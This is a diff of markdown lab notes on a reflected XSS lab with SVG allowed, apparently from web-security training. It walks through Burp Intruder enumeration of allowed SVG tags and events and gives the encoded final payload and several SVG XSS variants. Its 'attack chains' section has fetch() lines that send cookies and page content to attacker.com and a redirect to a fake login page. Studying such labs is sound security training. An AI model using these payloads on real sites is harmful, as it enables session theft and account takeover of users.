@@ -4967,27 +4967,30 @@ Execute
 
 ---
 
-# Lab - 12📝 Reflected XSS with SVG Allowed — Final Notes
+# Lab - 12 📝 Reflected XSS with SVG Allowed 
 
 ---
 
 ## 🧭 Overview
 
-This lab demonstrates a Reflected XSS vulnerability where:
+This lab demonstrates a **Reflected XSS vulnerability** where:
 
 ✔ User input is reflected in HTML  
 ✔ Most HTML tags are blocked ❌  
 ✔ Some SVG tags & events are allowed ✔  
 
-👉 *Goal:*
+👉 **Goal:**
 
+```
 alert(1)
+```
 
 ---
 
 ## 🧠 Core Concept
 
-When HTML is blocked → switch to SVG  
+HTML blocked → switch to SVG  
+
 Find allowed tag + allowed event → execute JS  
 
 ---
@@ -5000,33 +5003,32 @@ User Input → Server → HTML Response → Browser parses SVG → Event trigger
 
 ## 🧠 Source
 
-Search parameter:
-
+```
 ?search=INPUT
+```
 
 ---
 
 ## 🧠 Sink
 
-HTML context (reflected into page)
+Reflected into HTML page  
 
 ---
 
 ## ⚠️ Restrictions
 
-<script> ❌
-<img> ❌
-Most HTML tags ❌
+```
+<script>  → blocked
+<img>     → blocked
+Most HTML → blocked
 
-Some SVG tags ✔
-Some SVG events ✔
-
-
----
-
-## 🧠 Key Discovery (via Burp Intruder)
+SVG tags        → allowed
+Some SVG events → allowed
+```
 
 ---
+
+## 🧠 Key Discovery (Burp Intruder)
 
 ### 🔹 Allowed TAGS
 
@@ -5036,106 +5038,188 @@ Some SVG events ✔
 <title>
 <image>
 ```
----
-
-## 🪜 Lab Walkthrough
 
 ---
 
-### Step 1 — Test Reflection
+### 🔹 Allowed EVENT
 
-
-test123
-
-
-✔ Reflected in page  
+```
+onbegin
+```
 
 ---
 
-### Step 2 — Try Basic Payload
+## 🪜 Lab Walkthrough 
+
+---
+
+### Step 1 — Try Basic Payload
+
+Inject the following payload:
 
 ```
 <img src=1 onerror=alert(1)>
 ```
 
-❌ Blocked  
+❌ Observe that this payload gets blocked  
+
+👉 Indicates filtering/WAF is in place  
 
 ---
 
-### Step 3 — Find Allowed Tags
-  
-Go to search bar and add random input. Intercept the request and send it to intruder.
-Replace input with:
+### Step 2 — Prepare for Testing with Intruder
 
-Payload used:
+- Open Burp's browser  
+- Use the **search function** in the lab  
+- Send the request to **Burp Intruder**  
+
+---
+
+### Step 3 — Setup Initial Payload Position
+
+In the request template:
+
+Replace search parameter value with:
+
+```
+<>
+```
+
+Now:
+
+- Place cursor between `< >`  
+- Click **Add §**
+
+Final payload position:
 
 ```
 <§§>
 ```
 
-👉 Found SVG-related tags allowed ✔  
+---
 
-![SVG allowed tag](../images/svg-allowed-tags.png)
+### Step 4 — Load Tag Payloads
+
+- Visit XSS Cheat Sheet  
+- Click **Copy tags to clipboard**  
+
+In Intruder:
+
+- Go to **Payloads panel**  
+- Click **Paste**  
+- Click **Start attack** 🚀  
 
 ---
 
-### Step 4 — Find Allowed Events
+### Step 5 — Analyze Tag Results
 
-Payload used:
+After attack completes:
 
-```
-<svg><animatetransform §§=1>
-```
+- Review results  
 
-👉 Found:
+Observation:
 
+- Most payloads → **400 response (blocked)** ❌  
+- Some payloads → **200 response (allowed)** ✔  
 
-onbegin ✔
-
-
-![SVG allowed event](../images/svg-allowed-events.png)
-
----
-
-### Step 5 — Build Payload
+Allowed tags identified:
 
 ```
-<svg><animatetransform onbegin=alert(1)>
-```
-  
----
-
-### Step 6 — Break Context
-
-```
-"><svg><animatetransform onbegin=alert(1)>
+<svg>
+<animatetransform>
+<title>
+<image>
 ```
 
 ---
 
-### Step 7 — Encode Payload (IMPORTANT)
+### 📸 Screenshot — Allowed SVG Tags
 
-```
-%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
-```
-  
+![allowed svg tags](../images/svg-allowed-tags.png)
+
 ---
 
-💥 FINAL PAYLOAD
+### Step 6 — Prepare Event Enumeration
+
+Go back to Intruder and replace search term with:
+
+```
+<svg><animatetransform%20=1>
+```
+
+---
+
+### Step 7 — Setup Event Payload Position
+
+- Place cursor before `=`  
+- Click **Add §**
+
+Final payload:
+
+```
+<svg><animatetransform%20§§=1>
+```
+
+---
+
+### Step 8 — Load Event Payloads
+
+- Visit XSS Cheat Sheet  
+- Click **Copy events to clipboard**  
+
+In Intruder:
+
+- Click **Clear** (remove previous payloads)  
+- Click **Paste** (add events list)  
+- Click **Start attack** 🚀  
+
+---
+
+### Step 9 — Analyze Event Results
+
+After attack completes:
+
+- Review results  
+
+Observation:
+
+- Most events → **400 response (blocked)** ❌  
+- One event → **200 response (allowed)** ✔  
+
+Allowed event:
+
+```
+onbegin
+```
+
+---
+
+### 📸 Screenshot — Allowed SVG Events
+
+![allowed svg events](../images/svg-allowed-events.png)
+
+---
+
+### Step 10 — Confirm Exploit
+
+Visit the following URL in browser:
 
 ```
 https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
 ```
 
-(Encode before sending to victim)
-  
-![SVG final payload](../images/svg-final-payload.png)
+✔ `alert(1)` is triggered  
+✔ Lab is solved  
+
+---
+
+### 📸 Screenshot — Final Payload Execution
+
+![svg xss execution](../images/svg-final-payload.png)
 
 ---
 
 ## 🧠 Payload Breakdown
-
----
 
 ### 🔹 Context Break
 
@@ -5173,7 +5257,7 @@ Supports animation events
 onbegin
 ```
 
-Executes automatically when animation starts  
+Executes automatically  
 
 ---
 
@@ -5193,12 +5277,12 @@ Runs JavaScript
 2️⃣ Server reflects input  
 3️⃣ Browser parses SVG  
 4️⃣ Animation starts  
-5️⃣ onbegin fires  
+5️⃣ onbegin triggers  
 6️⃣ alert executes 💥  
 
 ---
 
-## 🧠 🔥 Encoding Concept (IMPORTANT)
+## 🧠 Encoding Concept (IMPORTANT)
 
 Raw payload → may break URL ❌  
 Encoded payload → safe & executable ✔  
@@ -5215,26 +5299,22 @@ Examples:
 
 ## 🧠 Key Learning
 
-We don’t guess payloads ❌  
-We ENUMERATE allowed behavior ✔  
+❌ Don’t guess payloads  
+✔ Always enumerate allowed behavior  
 
 ---
 
 ## 🌍 Real-World SVG XSS Scenarios
 
----
-
-### 🟢 1️⃣ Basic SVG Auto Trigger
+### 🟢 Basic SVG
 
 ```
 <svg onload=alert(1)>
 ```
 
-✔ Works if onload allowed  
-
 ---
 
-### 🟢 2️⃣ Animation-Based (Lab Style)
+### 🟢 Animation-Based
 
 ```
 <svg><animate onbegin=alert(1)>
@@ -5242,7 +5322,7 @@ We ENUMERATE allowed behavior ✔
 
 ---
 
-### 🟢 3️⃣ Transform-Based
+### 🟢 Transform-Based
 
 ```
 <svg><animatetransform onbegin=alert(1)>
@@ -5250,7 +5330,7 @@ We ENUMERATE allowed behavior ✔
 
 ---
 
-### 🟢 4️⃣ Image Inside SVG
+### 🟢 Image Inside SVG
 
 ```
 <svg><image href=1 onerror=alert(1)>
@@ -5258,7 +5338,7 @@ We ENUMERATE allowed behavior ✔
 
 ---
 
-### 🟢 5️⃣ Title Tag Trick
+### 🟢 Title Trick
 
 ```
 <svg><title onmouseover=alert(1)>
@@ -5266,70 +5346,61 @@ We ENUMERATE allowed behavior ✔
 
 ---
 
-### 🟢 6️⃣ foreignObject (High Impact)
+### 🟢 Advanced
 
 ```
-'<svg><foreignObject><script>alert(1)</script></foreignObject></svg>'
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
 ```
 
-### 🟢 7️⃣ Event Chaining
+---
+
+### 🟢 Event Chaining
+
 ```
 <svg><animatetransform onbegin=eval('alert(1)')>
 ```
 
 ---
 
-### 🟢 8️⃣ Obfuscated Payload
+### 🟢 Obfuscated Payload
+
 ```
 <svg><animatetransform onbegin=alert(String.fromCharCode(49))>
 ```
 
 ---
 
-### 🟢 9️⃣ URL-Based Delivery
+### 🟢 URL-Based Delivery
+
 ```
 https://target.com/?search=ENCODED_PAYLOAD
 ```
 
 ---
 
-### 🟢 🔟 Iframe Delivery (Real Attack)
+### 🟢 Iframe Delivery
+
 ```
 <iframe src="https://target.com/?search=PAYLOAD"></iframe>
 ```
-
-✔ Used in phishing / exploit chains
 
 ---
 
 ## 🎯 High-Value Targets
 
-- Search functionality
-
-- Filters & query parameters
-
-- Reporting dashboards
-
-- Analytics pages
-
-- Legacy frontend apps
-
-- CMS preview pages
-
-- Error pages rendering query params
-
-- Tracking/redirect endpoints
-
-
+- Search endpoints  
+- Filters & query parameters  
+- Analytics dashboards  
+- Error pages  
+- CMS preview features  
+- Redirect / tracking endpoints  
 
 ---
 
 ## 🔗 Attack Chains (Real Impact)
 
-
----
-
 ### 🔥 Session Hijacking
+
 ```
 fetch("https://attacker.com?c="+document.cookie)
 ```
@@ -5338,128 +5409,67 @@ fetch("https://attacker.com?c="+document.cookie)
 
 ### 🔥 Account Takeover
 
-Steal:
-
-- Session tokens
-
-- Auth cookies
-
+Steal session cookies & tokens  
 
 ---
 
 ### 🔥 Admin Compromise
 
-Admin visits malicious link → payload executes
+Admin opens malicious link → payload executes  
 
 ---
 
 ### 🔥 Data Exfiltration
+
 ```
 fetch("https://attacker.com?d="+document.body.innerHTML)
 ```
 
 ---
 
-### 🔥 Phishing Redirection
+### 🔥 Phishing Redirect
+
 ```
 onbegin="location='https://fake-login.com'"
 ```
 
 ---
 
-### 🔥 DOM Clobbering + XSS Chain (Advanced)
-
-Override DOM elements → manipulate JS behavior → escalate impact
-
----
-
-### 🔥 OAuth Token Theft (High Value)
-
-Inject payload in redirect/preview → steal access_token from DOM
-
-
----
-
-### 🧪 Testing Methodology
-
-1️⃣ Test reflection
-2️⃣ Try basic payload
-3️⃣ Detect blocking
-4️⃣ Enumerate tags
-5️⃣ Enumerate events
-6️⃣ Identify auto-trigger events
-7️⃣ Build payload
-8️⃣ Break context
-9️⃣ Encode payload
-🔟 Execute
-
-
----
-
-## ⚠️ Why This XSS Is Special
-
-- HTML blocked but SVG allowed
-
-- Uses animation-based execution
-
-- Very common in real-world WAF bypass
-
----
-
-## 🛡 Remediation
-
-- Disable SVG if not needed
-
-- Sanitize SVG content
-
-- Escape all user input
-
-- Avoid dynamic HTML injection
-
-- Use strict CSP
-
-- Whitelist safe attributes only
-
----
-
 ## 🧠 Bug Hunter Mindset
 
-Ask:
-
-👉 Are HTML tags blocked?
-👉 Is SVG allowed?
-👉 Which SVG tags work?
-👉 Which events auto-trigger?
-👉 Do I need encoding?
-
+👉 Which tags are allowed?  
+👉 Which events are allowed?  
+👉 Does it auto-trigger?  
+👉 Do I need encoding?  
 
 ---
 
-## 🧠 Ultimate Mental Model
+## 🧠 Ultimate Formula
 
-Enumerate
-↓
-Find allowed SVG
-↓
-Find allowed event
-↓
-Combine
-↓
-Encode
-↓
-Execute
-
+Enumerate  
+↓  
+Find Allowed  
+↓  
+Combine  
+↓  
+Encode  
+↓  
+Execute  
 
 ---
 
-## 💡 Extra Tips
+## 🎯 Final Summary
 
-- Always test SVG when HTML blocked
+HTML blocked  
+SVG allowed  
+onbegin allowed  
 
-- Focus on auto-trigger events (onload, onbegin)
+→ XSS achieved 💥  
 
-- Use Burp Intruder for discovery
+---
 
-- Encoding = critical in reflected XSS
+## 🚀 Next Level
 
-- Execution > payload complexity
+👉 SVG + CSP bypass  
+👉 XSS polyglots  
+👉 Advanced WAF evasion
